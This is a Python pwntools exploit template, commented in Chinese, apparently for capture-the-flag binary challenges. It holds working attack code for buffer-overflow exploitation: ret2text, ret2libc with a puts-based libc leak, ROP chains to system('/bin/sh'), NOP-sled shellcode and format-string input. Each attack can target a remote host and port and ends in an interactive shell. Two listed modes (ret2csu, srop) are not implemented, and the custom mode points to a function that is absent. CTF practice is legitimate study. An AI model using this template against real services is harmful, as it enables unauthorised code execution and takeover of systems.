#!/usr/bin/env python3
"""
Pwn 通用利用模板 (pwntools)
使用方法：
    # 模式1: 本地 pwn
    python3 pwn_template.py --binary ./chall --mode ret2text --offset 72 --target 0x401234
    python3 pwn_template.py --binary ./chall --mode ret2libc --offset 72 --libc ./libc.so.6
    python3 pwn_template.py --binary ./chall --mode rop --offset 72 --libc ./libc.so.6
    python3 pwn_template.py --binary ./chall --mode fmt --fmt "%p%p%p"
    python3 pwn_template.py --binary ./chall --mode shellcode --offset 40 --shellcode ./shellcode.bin
    python3 pwn_template.py --binary ./chall --mode custom
    
    # 模式2: 远程
    python3 pwn_template.py --remote target.com:9999 --mode ret2libc ...
"""
import argparse
from pwn import *

def get_args():
    p = argparse.ArgumentParser(description="Pwn 通用利用模板")
    p.add_argument("--binary", help="本地可执行文件")
    p.add_argument("--remote", help="远程 target:port")
    p.add_argument("--libc", help="libc.so.6 路径")
    p.add_argument("--mode", required=True, choices=["ret2text","ret2libc","ret2csu","srop","fmt","shellcode","rop","custom"])
    p.add_argument("--offset", type=int, default=72, help="溢出偏移")
    p.add_argument("--target", type=lambda x: int(x,0), help="ret2text 目标函数地址 hex 或 0x401234")
    p.add_argument("--fmt", default="", help="格式化字符串 payload")
    p.add_argument("--shellcode", help="shellcode 文件 (raw 二进制)")
    p.add_argument("--gadget", help="pop rdi; ret gadget 地址 (hex)")
    p.add_argument("--binsh", type=lambda x: int(x,0), help="/bin/sh 地址")
    p.add_argument("--system", type=lambda x: int(x,0), help="system 函数地址")
    p.add_argument("--onegadget", type=lambda x: int(x,0), help="one_gadget 地址")
    p.add_argument("--arch", default="amd64", choices=["amd64","i386","arm","aarch64"])
    p.add_argument("--log", default="info", choices=["debug","info","warn","error"])
    return p.parse_args()

def start_proc(args):
    context(arch=args.arch, os='linux', log_level=args.log)
    if args.remote:
        host, port = args.remote.split(":")
        return remote(host, int(port))
    return process(args.binary)

def mode_ret2text(args, binary):
    p = start_proc(args)
    payload = cyclic(args.offset) + (p64(args.target) if args.arch == "amd64" else p32(args.target))
    info(f"Sending payload ({len(payload)} bytes)...")
    p.sendline(payload)
    p.interactive()

def mode_ret2libc(args, binary, libc):
    p = start_proc(args)
    # Step 1: 泄漏 libc 基址
    rop_leak = ROP(binary)
    try:
        rop_leak.puts(binary.got['puts'])
    except:
        try: rop_leak.call(binary.plt['puts'], [binary.got['puts']])
        except: error("找不到 puts plt/got")
    rop_leak.raw(binary.symbols['main'])
    payload = cyclic(args.offset) + rop_leak.chain()
    info(f"Payload 1: Leak libc base ({len(payload)} bytes)...")
    p.sendline(payload)
    p.recvuntil(b"\n")
    leaked = u64(p.recvline().strip().ljust(8, b"\x00")) if args.arch=="amd64" else u32(p.recvline().strip()[:4])
    libc_base = leaked - libc.symbols["puts"]
    success(f"Libc base: 0x{libc_base:x}")
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh"))
    success(f"system=0x{system:x}, /bin/sh=0x{binsh:x}")

    # Step 2: ret2system
    rop2 = ROP(binary)
    if args.arch == "amd64":
        try: pop_rdi = args.gadget if args.gadget else rop2.find_gadget(['pop rdi', 'ret'])[0]
        except: pop_rdi = 0
        rop2.raw(pop_rdi)
        rop2.raw(binsh)
        try: rop2.raw(rop2.find_gadget(['ret'])[0])  # 对齐
        except: pass
        rop2.raw(system)
    else:
        rop2.raw(system)
        rop2.raw(0xdeadbeef)
        rop2.raw(binsh)
    p.sendline(cyclic(args.offset) + rop2.chain())
    p.interactive()

def mode_shellcode(args, binary):
    p = start_proc(args)
    if args.shellcode:
        with open(args.shellcode, "rb") as f:
            sc = f.read()
    else:
        sc = asm(shellcraft.sh(), arch=args.arch)
    nops = b"\x90" * 0x40
    payload = nops + sc
    p.sendline(payload)
    p.interactive()

def mode_fmt(args, binary):
    p = start_proc(args)
    payload = args.fmt.encode()
    p.sendline(payload)
    p.interactive()

def mode_rop(args, binary, libc):
    p = start_proc(args)
    rop = ROP(binary, libc)
    rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh"))])
    payload = cyclic(args.offset) + rop.chain()
    info(f"ROP chain ({len(payload)} bytes)...")
    p.sendline(payload)
    p.interactive()

def main():
    args = get_args()
    if args.binary:
        binary = ELF(args.binary)
        info(f"Binary: {args.binary}")
        info(f"  PIE={binary.pie}, RELRO={binary.relro}, NX={binary.nx}, Canary={binary.canary}")
    if args.libc:
        libc = ELF(args.libc)
    else:
        libc = None

    if args.mode == "ret2text":
        mode_ret2text(args, ELF(args.binary))
    elif args.mode == "ret2libc":
        mode_ret2libc(args, ELF(args.binary), libc)
    elif args.mode == "shellcode":
        mode_shellcode(args, ELF(args.binary))
    elif args.mode == "fmt":
        mode_fmt(args, ELF(args.binary))
    elif args.mode == "rop":
        mode_rop(args, ELF(args.binary), libc)
    elif args.mode == "custom":
        info("自定义模式 - 打开 custom() 函数修改逻辑")
        # ================ 在这里写自定义利用逻辑 ================
        p = start_proc(args)
        # 自定义 payload...
        p.interactive()

if __name__ == "__main__":
    main()
